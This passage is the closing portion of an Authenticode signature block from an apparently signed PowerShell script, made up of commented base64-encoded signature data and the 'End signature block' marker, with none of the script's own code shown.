# NDAyMjUxODAwNDJaMD8GCSqGSIb3DQEJBDEyBDCb1i/66IeWQD8JdS1ilmWv1Ij0
# LUpnouTKQ6++y3Dg/OpoMQ6Jb3S/Jt7BRi/vctkwDQYJKoZIhvcNAQEBBQAEggIA
# oTcy7tawY5ZFfkBFRmb1BBSDkZ+a7HQaCZj5tEvMAvVAqjQhkHWXfOYrPMxPZq7P
# 8cbWMew/yWru50EnOzvFqs6eODrrH5IjeiHgmrbjundhQoHVJaaT4RefvC3EemXk
# K95mcWvj22HIxa9qNaNf6rX02VyjkGtD7mrNrB/zWUan/lrKvmnoTrORb8+wPv+m
# TMPbjysEqxX+zd7vdG080HNQOtz2UVJAkzCWM9SXxrswNx58dIoJHfVBzvuutXlS
# NX6d72CapbXpLo5JjtVRZI+2zihJFiH6GrCRi5k6y62yfq1JIT8IfQ/xzWnztKCa
# kxmxHsWdZlm8b4ZO2FkWxebHiEmrqlxkyy43QeaSLfbifpD1LL3zCf1xJfCrzAK7
# bnLXmCW4g/bO0CYoYBKhLr9samfc1tsZYoLss2fzlKVTLggZl4ejvhRwLoTCPd+2
# UNqPV4GrIeEj1afyQ7zHIVP31zW74dlkESt7SJsfY66u9flk7NckKMK5yK7qjGUK
# w+eQ+niAaV80YhXrQuORIu2OcdBG8dUeA9sQYPangzbpik4k9IuS7JghVnmxL+Ir
# 97g5V5U37eS3H99O5JLfOgbR49Xa7k/kGDDNB5NoNJS6bRbCnp+AKota5hoUZsVu
# RjJthPByJ2UfQsc6GkpWA6zCe3xs/DMti6e5Nru5uI8=
# SIG # End signature block
